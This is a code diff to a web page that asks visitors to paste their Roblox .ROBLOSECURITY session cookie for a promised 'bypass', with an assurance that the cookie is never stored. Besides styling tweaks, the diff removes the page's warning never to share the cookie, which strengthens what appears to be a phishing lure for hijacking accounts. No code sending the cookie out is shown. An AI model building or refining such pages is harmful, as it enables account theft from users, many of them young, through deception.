@@ -62,7 +62,7 @@
       padding-left: 0.85rem;
     }
 
-    /* badge / note row */
+    /* note row — replaced emoji with "!" */
     .note {
       background: rgba(255, 94, 94, 0.08);
       border-radius: 14px;
@@ -84,6 +84,14 @@
 
     .note-icon {
       font-size: 1rem;
+      font-weight: 800;
+      background: rgba(255, 94, 94, 0.25);
+      width: 22px;
+      height: 22px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 30px;
     }
 
     /* cookie label */
@@ -102,7 +110,7 @@
       border-radius: 18px;
       border: 1.5px solid #232837;
       transition: all 0.2s;
-      margin-bottom: 0.8rem;
+      margin-bottom: 1.2rem;
     }
 
     .input-group:focus-within {
@@ -126,18 +134,6 @@
       color: #3f4765;
       font-family: monospace;
       font-size: 0.75rem;
-    }
-
-    /* warning small text */
-    .cookie-warning {
-      font-size: 0.7rem;
-      color: #ff9f7c;
-      background: rgba(255, 159, 124, 0.08);
-      display: inline-block;
-      padding: 0.25rem 0.75rem;
-      border-radius: 30px;
-      margin-bottom: 1.8rem;
-      font-weight: 450;
     }
 
     /* button */
@@ -239,17 +235,15 @@
       Enter your .ROBLOSECURITY cookie below. We will verify, authenticate, and bypass your cookie automatically.
     </div>
 
+    <!-- Note: replaced emoji with "!" icon -->
     <div class="note">
-      <span class="note-icon">🔞</span>
+      <span class="note-icon">!</span>
       <span>Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</span>
     </div>
 
     <div class="label">.ROBLOSECURITY COOKIE</div>
     <div class="input-group">
       <input type="text" id="cookieInput" placeholder="_|WARNING: DO NOT SHARE THIS|_ paste cookie here" autocomplete="off" spellcheck="false">
-    </div>
-    <div class="cookie-warning">
-      ⚠️ NEVER share your cookie with anyone — processed only during verification.
     </div>
 
     <button class="bypass-btn" id="startBtn">
